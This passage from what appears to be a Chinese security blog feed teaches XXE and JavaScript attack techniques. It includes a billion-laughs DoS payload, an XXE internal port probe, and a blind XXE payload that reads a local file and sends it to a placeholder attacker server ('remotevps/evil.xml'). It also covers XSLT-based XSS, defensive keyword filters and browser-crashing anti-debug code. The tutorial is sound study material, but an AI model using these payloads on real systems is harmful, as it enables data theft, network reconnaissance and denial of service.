&quot;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&quot;&gt;</span><br><span class="line">&lt;!ENTITY lol8 &quot;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&quot;&gt;</span><br><span class="line">&lt;!ENTITY lol9 &quot;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;lolz&gt;&amp;lol9;&lt;/lolz&gt;</span><br></pre></td></tr></table></figure></div><p><strong>原理</strong>：递归引用，lol 实体具体还有 “lol” 字符串，然后一个 lol2 实体引用了 10 次 lol 实体，一个 lol3 实体引用了 10 次 lol2 实体，此时一个 lol3 实体就含有 10^2 个 “lol” 了，以此类推，lol9 实体含有 10^8 个 “lol” 字符串，最后再引用 lol9。</p><h2 id="探测内网端口"><a class="markdownIt-Anchor" href="#探测内网端口">#</a> 探测内网端口</h2><div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">xxe</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="keyword">name</span> <span class="keyword">ANY</span> &gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;http://127.0.0.1:80&quot;</span> &gt;</span>]&gt;</span> # 修改payload即可探测对应端口</span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">name</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure></div><h2 id="blind-xxe"><a class="markdownIt-Anchor" href="#blind-xxe">#</a> Blind XXE</h2><p>Blind XXE，字面意思也就是提交 xml 的服务器端点不再返回有效的数据，此时我们前面的一些利用方法就要失效了</p><h3 id="xxe-oob外带数据通道"><a class="markdownIt-Anchor" href="#xxe-oob外带数据通道">#</a> XXE OOB (外带数据通道)</h3><p><strong>概念</strong><br>带外数据 (out—of—band data)，有时也称为加速数据 (expedited data)，<br>是指连接双方中的一方发生重要事情，想要迅速地通知对方。这种通知在已经排队等待发送的任何 “普通”(有时称为 “带内”) 数据之前发送。带外数据设计为比普通数据有更高的优先级。带外数据是映射到现有的连接中的，而不是在客户机和服务器间再用一个连接。</p><p><strong>利用</strong><br>带外数据通道的建立是使用嵌套形式，利用外部实体中的 URL 发出访问，从而跟攻击者的服务器发生联系。但有些情况下不能在实体定义中引用参数实体，即有些解释器不允许在内层实体中使用外部连接，无论内层是一般实体还是参数实体。</p><p>将嵌套的实体声明放入到一个外部文件中，这里一般是放在攻击者的服务器上，这样做可以规避错误</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE ANY[&lt;!ENTITY % file SYSTEM &quot;file:///C:/1.txt&quot;&gt;&lt;!ENTITY % remote SYSTEM &quot;http://remotevps/evil.xml&quot;&gt;%remote;%all;]&gt;&lt;root&gt;&amp;send;&lt;/root&gt;</span><br></pre></td></tr></table></figure></div><p>evil.xml：</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % all &quot;&lt;!ENTITY send SYSTEM &#x27;http://remotevps/1.php?file=%file;&#x27;&gt;&quot;&gt;</span><br></pre></td></tr></table></figure></div><p>实体 remote，all，send 的引用顺序很重要，首先对 remote 引用目的是将外部文件 evil.xml 引入到解释上下文中，然后执行 % all，这时会检测到 send 实体，在 root 节点中引用 send，就可以成功实现数据转发。当请求发送以后，攻击者的服务器上就能查看到 1.txt 中的内容。</p><h2 id="xxe漏洞防御"><a class="markdownIt-Anchor" href="#xxe漏洞防御">#</a> XXE 漏洞防御</h2><p><strong>1、使用开发语言提供的禁用外部实体的方法</strong><br> php:</p><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">libxml_disable_entity_loader</span>(<span class="literal">true</span>);</span><br></pre></td></tr></table></figure></div><p>java:</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">DocumentBuilderFactory</span> <span class="variable">dbf</span> <span class="operator">=</span>DocumentBuilderFactory.newInstance();</span><br><span class="line">dbf.setExpandEntityReferences(<span class="literal">false</span>);</span><br></pre></td></tr></table></figure></div><p>Python:</p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> lxml <span class="keyword">import</span> etree</span><br><span class="line">xmlData = etree.parse(xmlSource,etree.XMLParser(resolve_entities=<span class="literal">False</span>))</span><br></pre></td></tr></table></figure></div><p><strong>2、过滤用户提交的 XML 数据</strong><br>过滤关键字： <code>&lt;\!DOCTYPE</code>  和 <code>&lt;\!ENTITY</code> ，或者 <code>SYSTEM</code>  和 <code>PUBLIC</code> 。<br><strong>3、不允许 XML 中含有自己定义的 DTD</strong></p><h2 id="不止xxe"><a class="markdownIt-Anchor" href="#不止xxe">#</a> 不止 XXE</h2><h3 id="xslt"><a class="markdownIt-Anchor" href="#xslt">#</a> XSLT</h3><p>XSLT 全称为 Extensible Stylesheet Language Transformations，主要用于编写样式表将 XML 转换为其他格式的文档，如 XHTML、JSON、文本等。XSLT 也是基于 XML 的，但具备强大的灵活性和扩展性。不仅可以用于文档转换，还常被用于数据清洗、报告生成以及数据的提取和重组等任务。</p><p>XSLT 单独保存为文件时可以是  <code>.xsl</code>  或者  <code>.xslt</code>  后缀。以我们之前的  <code>note</code>  XML 为例，以下  <code>note.xsl</code>  将其转换为 XHTML 文档:</p><div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">xsl:stylesheet</span> <span class="attr">version</span>=<span class="string">&quot;1.0&quot;</span></span></span><br><span class="line"><span class="tag"><span class="attr">xmlns:xsl</span>=<span class="string">&quot;http://www.w3.org/1999/XSL/Transform&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">xsl:template</span> <span class="attr">match</span>=<span class="string">&quot;/&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">h1</span>&gt;</span>Note<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">p</span>&gt;</span>To: <span class="tag">&lt;<span class="name">xsl:value-of</span> <span class="attr">select</span>=<span class="string">&quot;note/to&quot;</span>/&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">p</span>&gt;</span>From: <span class="tag">&lt;<span class="name">xsl:value-of</span> <span class="attr">select</span>=<span class="string">&quot;note/from&quot;</span>/&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">xsl:template</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">xsl:stylesheet</span>&gt;</span></span><br></pre></td></tr></table></figure></div><h3 id="xss"><a class="markdownIt-Anchor" href="#xss">#</a> XSS</h3><p>XSLT 可以为 XML 提供样式转换，而且这个转换是浏览器也支持的。既然可以将 XML 转换成 HTML 来渲染，那么是否支持 HTML 中的一些特性呢，比如执行 JavaScript 脚本？答案是肯定的。</p><p>我们稍微修改一下前文中的样式表，如下所示:</p><div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">xsl:stylesheet</span> <span class="attr">version</span>=<span class="string">&quot;1.0&quot;</span></span></span><br><span class="line"><span class="tag"><span class="attr">xmlns:xsl</span>=<span class="string">&quot;http://www.w3.org/1999/XSL/Transform&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">xsl:template</span> <span class="attr">match</span>=<span class="string">&quot;/&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"> <span class="title function_">alert</span>(<span class="regexp">/xss/</span>) </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">h1</span>&gt;</span>Note<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">p</span>&gt;</span>To: <span class="tag">&lt;<span class="name">xsl:value-of</span> <span class="attr">select</span>=<span class="string">&quot;note/to&quot;</span>/&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">p</span>&gt;</span>From: <span class="tag">&lt;<span class="name">xsl:value-of</span> <span class="attr">select</span>=<span class="string">&quot;note/from&quot;</span>/&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">xsl:template</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">xsl:stylesheet</span>&gt;</span></span><br></pre></td></tr></table></figure></div><p>除了间接引用 XSLT，在 XML 文档本身中，也可以通过命名空间指定 XHTML 来执行 JavaScript 代码，示例  <code>xss.xml</code>  如下:</p><div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span>   </span><br><span class="line"><span class="tag">&lt;<span class="name">note</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">to</span>&gt;</span>Alice<span class="tag">&lt;/<span class="name">to</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">from</span>&gt;</span>Bob<span class="tag">&lt;/<span class="name">from</span>&gt;</span></span><br><span class="line">   &lt;xh:scriptxmlns:xh=&quot;http://www.w3.org/1999/xhtml&quot;&gt;alert(/xss/)<span class="tag">&lt;/<span class="name">xh:script</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;/<span class="name">note</span>&gt;</span> </span><br></pre></td></tr></table></figure></div><p>因为如果在 XML 中使用  <code>&lt;script&gt;</code>  标签会被认为是一个普通元素而不会将其子元素当成 JavaScript 执行。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;xml&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#xml&quot;&gt;#&lt;/a&gt; XML&lt;/h2&gt;
&lt;p&gt;XML 指可扩展标记语言（EXtensible Markup Language）。&lt;br&gt;
XML 的设计宗旨是&lt;strong&gt;传输数据</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>adout JS</title>
    <link href="http://example.com/2024/05/23/adout-JS/"/>
    <id>http://example.com/2024/05/23/adout-JS/</id>
    <published>2024-05-23T02:54:43.000Z</published>
    <updated>2024-05-24T15:14:19.158Z</updated>
    
    <content type="html"><![CDATA[<h1 id="js混淆与反混淆"><a class="markdownIt-Anchor" href="#js混淆与反混淆">#</a> JS 混淆与反混淆</h1><p><code>JavaScript</code>  混淆 <code>（Obfuscation）</code> 是指通过一系列技术手段，使 JS 代码变得难以理解和分析，增加代码的复杂性和混淆度，阻碍逆向工程和代码盗用。实际上就是一种保护 JS 代码的手段。</p><p>JS 最早被设计出来就是为了在客户端运行，直接以源码的形式传递给客户端，如果不做处理则完全公开透明，任何人都可以读、分析、复制、盗用，甚至篡改源码与数据，这是网站开发者不愿意看到的。</p><p>JS 混淆也是 CTF 比赛中常见的 Web 题型</p><h2 id="常见混淆手段"><a class="markdownIt-Anchor" href="#常见混淆手段">#</a> 常见混淆手段</h2><h3 id="代码压缩"><a class="markdownIt-Anchor" href="#代码压缩">#</a> 代码压缩</h3><p>就是将代码中的空格和换行符全部删除让代码变成一坨甚至一行，这种方式甚至会出现在一些代码审计的题中阻碍代码阅读</p><h2 id="代码混淆"><a class="markdownIt-Anchor" href="#代码混淆">#</a> 代码混淆</h2><h3 id="变量名函数名替换"><a class="markdownIt-Anchor" href="#变量名函数名替换">#</a> 变量名 / 函数名替换</h3><p>将有意义的变量名和函数名替换为随机生成的名称</p><div class="highlight-container" data-rel="Js"><figure class="iseeu highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">function calculateArea(radius) &#123;</span></span><br><span class="line"><span class="comment">  return Math.PI * radius * radius;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">console.log(calculateArea(5));</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">_0x2d8f05</span>(<span class="params">_0x4b083b</span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="title class_">Math</span>.<span class="property">PI</span> * _0x4b083b * _0x4b083b;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">_0x2d8f05</span>(<span class="number">5</span>));</span><br></pre></td></tr></table></figure></div><h3 id="字符串混淆"><a class="markdownIt-Anchor" href="#字符串混淆">#</a> 字符串混淆</h3><p>将代码中的字符串替换为十六或八进制、编码或者加密形式，防止代码被轻易读取，或者通过拼接使之不可以通过搜索查找原本字符串</p><div class="highlight-container" data-rel="Js"><figure class="iseeu highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// let str = &#x27;eval&#x27;</span></span><br><span class="line"><span class="keyword">let</span> str = <span class="string">&#x27;\u0065\u0076\u0061\u006c&#x27;</span><span class="comment">//unicode编码</span></span><br><span class="line"><span class="keyword">let</span> str = <span class="number">14.</span>.<span class="title function_">toString</span>(<span class="number">15</span>) + <span class="number">31.</span>.<span class="title function_">toString</span>(<span class="number">32</span>) + <span class="number">0xf1</span>.<span class="title function_">toString</span>(<span class="number">22</span>) <span class="comment">//利用toStirng()</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// console.log(&quot;Hello, world!&quot;);</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;\x48\x65\x6c\x6c\x6f\x2c\x20\x77\x6f\x72\x6c\x64\x21&quot;</span>); <span class="comment">//十六进制</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// let str = &#x27;eval&#x27;</span></span><br><span class="line"><span class="keyword">let</span> str = <span class="string">&#x27;e&#x27;</span>+<span class="string">&#x27;v&#x27;</span>+<span class="string">&#x27;a&#x27;</span>+<span class="string">&#x27;l&#x27;</span> <span class="comment">//拼接</span></span><br></pre></td></tr></table></figure></div><h3 id="访问成员变量的方法"><a class="markdownIt-Anchor" href="#访问成员变量的方法">#</a> 访问成员变量的方法</h3><p>JavaScript 中可以通过 <code>window.eval()</code>  访问 windows 对象的 eval 方法，也可以用 <code>window['eval']</code>  来访问</p><h3 id="利用数组拆分"><a class="markdownIt-Anchor" href="#利用数组拆分">#</a> 利用数组拆分</h3><div class="highlight-container" data-rel="Js"><figure class="iseeu highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// console.log(new window.Date().getTime())  </span></span><br><span class="line"><span class="keyword">var</span> arr = [<span class="string">&#x27;log&#x27;</span>,<span class="string">&#x27;Date&#x27;</span>,<span class="string">&#x27;getTime&#x27;</span>]</span><br><span class="line"><span class="variable language_">console</span>[arr[<span class="number">0</span>]](<span class="keyword">new</span> <span class="variable language_">window</span>[arr[<span class="number">1</span>]]()[arr[<span class="number">2</span>]]())</span><br><span class="line"><span class="number">14.</span>.<span class="title function_">toString</span>(<span class="number">15</span>) + <span class="number">31.</span>.<span class="title function_">toString</span>(<span class="number">32</span>) + <span class="number">0xf1</span>.<span class="title function_">toString</span>(<span class="number">22</span>)</span><br></pre></td></tr></table></figure></div><h3 id="常量改算术表达式"><a class="markdownIt-Anchor" href="#常量改算术表达式">#</a> 常量改算术表达式</h3><div class="highlight-container" data-rel="Js"><figure class="iseeu highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// var num = 1234</span></span><br><span class="line"><span class="keyword">var</span> num = <span class="number">602216</span> ^ <span class="number">603322</span> </span><br></pre></td></tr></table></figure></div><p>还可以进一步改成函数调用表达式</p><div class="highlight-container" data-rel="Js"><figure class="iseeu highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// var num = 602216 ^ 603322 </span></span><br><span class="line"><span class="keyword">var</span> a = <span class="keyword">function</span> (<span class="params">s, h</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> s ^ h;</span><br><span class="line">&#125;(<span class="number">602216</span>, <span class="number">603322</span>)</span><br></pre></td></tr></table></figure></div><p>像这种方式在 js 中还有很多，（甚至可以套娃？滑稽.jpg</p><h3 id="反调试"><a class="markdownIt-Anchor" href="#反调试">#</a> 反调试</h3><h4 id="禁止debugger"><a class="markdownIt-Anchor" href="#禁止debugger">#</a> 禁止 debugger</h4><h4 id="定时器死循环"><a class="markdownIt-Anchor" href="#定时器死循环">#</a> 定时器死循环</h4><div class="highlight-container" data-rel="Js"><figure class="iseeu highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">debug</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">debugger</span>;</span><br><span class="line">    <span class="built_in">setTimeout</span>(debug, <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">debug</span>(); <span class="comment">//这个可以把debug()的部分注释掉</span></span><br></pre></td></tr></table></figure></div><div class="highlight-container" data-rel="Js"><figure class="iseeu highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> c = <span class="keyword">new</span> <span class="title class_">RegExp</span>(<span class="string">&quot;1&quot;</span>);</span><br><span class="line">c.<span class="property">toString</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="title function_">alert</span>(<span class="string">&quot;检测到调试&quot;</span>)</span><br><span class="line">    <span class="built_in">setInterval</span>(<span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">debugger</span></span><br><span class="line">    &#125;, <span class="number">1000</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(c);</span><br></pre></td></tr></table></figure></div><h3 id="内存耗尽"><a class="markdownIt-Anchor" href="#内存耗尽">#</a> 内存耗尽</h3><p>更隐蔽的反调试手段，代码运行造成的内存占用会越来越大，很快会使浏览器崩溃。</p><div class="highlight-container" data-rel="Js"><figure class="iseeu highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> startTime = <span class="keyword">new</span> <span class="title class_">Date</span>();</span><br><span class="line"><span class="keyword">debugger</span>;</span><br><span class="line"><span class="keyword">var</span> endTime = <span class="keyword">new</span> <span class="title class_">Date</span>();</span><br><span class="line"><span class="keyword">var</span> isDev = endTime - startTime &gt; <span class="number">100</span>;</span><br><span class="line"><span class="keyword">var</span> stack = [];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (isDev) &#123;</span><br><span class="line">    <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">        stack.<span class="title function_">push</span>(<span class="variable language_">this</span>);</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(stack.<span class="property">length</span>, <span class="variable language_">this</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><h3 id="清空控制台"><a class="markdownIt-Anchor" href="#清空控制台">#</a> 清空控制台</h3><div class="highlight-container" data-rel="Js"><figure class="iseeu highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">clear</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">clear</span>();</span><br><span class="line">    <span class="built_in">setTimeout</span>(clear, <span class="number">10</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">clear</span>();</span><br></pre></td></tr></table></figure></div><h3 id="检测函数-对象属性修改"><a class="markdownIt-Anchor" href="#检测函数-对象属性修改">#</a> 检测函数、对象属性修改</h3><p>攻击者在调试的时，经常会把防护的函数删除，或者把检测数据对象进行篡改。可以检测函数内容，在原型上设置禁止修改。</p><div class="highlight-container" data-rel="Js"><figure class="iseeu highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// eval函数</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">eval</span>(<span class="params"></span>) &#123;</span><br><span class="line">    [native code]</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//使用eval.toString进行内容匹配”[native code]”，可以轻易饶过</span></span><br><span class="line"><span class="variable language_">window</span>.<span class="property">eval</span> = <span class="keyword">function</span>(<span class="params">str</span>)&#123;</span><br><span class="line">        <span class="regexp">/[native code]/</span></span><br><span class="line">        <span class="comment">//[native code]</span></span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[native code]&quot;</span>);</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//对eval.toString进行全匹配，通过重写toString就可以绕过</span></span><br><span class="line"><span class="variable language_">window</span>.<span class="property">eval</span> = <span class="keyword">function</span>(<span class="params">str</span>)&#123;</span><br><span class="line">        <span class="comment">//....</span></span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="variable language_">window</span>.<span class="property">eval</span>.<span class="property">toString</span> = <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">function</span> <span class="title function_">eval</span>(<span class="params"></span>) &#123;</span><br><span class="line">            [native code]</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//检测eval.toString和eval的原型</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">hijacked</span>(<span class="params">fun</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;prototype&quot;</span> <span class="keyword">in</span> fun || fun.<span class="title function_">toString</span>().<span class="title function_">replace</span>(<span class="regexp">/\n|\s/g</span>, <span class="string">&quot;&quot;</span>) != <span class="string">&quot;function&quot;</span>+fun.<span class="property">name</span>+<span class="string">&quot;()&#123;[nativecode]&#125;&quot;</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></div><h2 id="一些混淆与反混淆工具"><a class="markdownIt-Anchor" href="#一些混淆与反混淆工具">#</a> 一些混淆与反混淆工具</h2><p>混淆工具：</p><ul><li><a class="link" href="http://yui.github.io/yuicompressor/">YUI Compressor <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li><li><a class="link" href="https://developers.google.com/closure/compiler/">Google Closure Compiler <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li><li><a class="link" href="https://github.com/mishoo/UglifyJS">UglifyJS <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li><li><a class="link" href="https://jscrambler.com/en/">JScrambler <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> // 付费，其余均为免费</li></ul><p>反混淆工具：</p><ul><li><a class="link" href="http://damilarefagbemi.com/experiments-in-js-obfuscation-deobfuscation-for-hacking-html5-apps-and-malware-analysis/jsbeautifier.org">jsbeautifier.org <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li><li><a class="link" href="http://relentless-coding.org/projects/jsdetox">JSDetox <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li></ul><h1 id="js原型链污染"><a class="markdownIt-Anchor" href="#js原型链污染">#</a> JS 原型链污染</h1><h2 id="js创建对象"><a class="markdownIt-Anchor" href="#js创建对象">#</a> JS 创建对象</h2><div class="highlight-container" data-rel="Js"><figure class="iseeu highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//普通方式</span></span><br><span class="line"><span class="keyword">var</span> a = &#123;<span class="attr">name</span>:<span class="string">&#x27;pan&#x27;</span>,<span class="attr">age</span>:<span class="number">19</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//构造函数方式</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">a</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">name</span> = <span class="string">&#x27;pan&#x27;</span>;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">age</span> = <span class="number">19</span>;</span><br><span class="line">&#125;</span><br><span class="line">a.<span class="property"><span 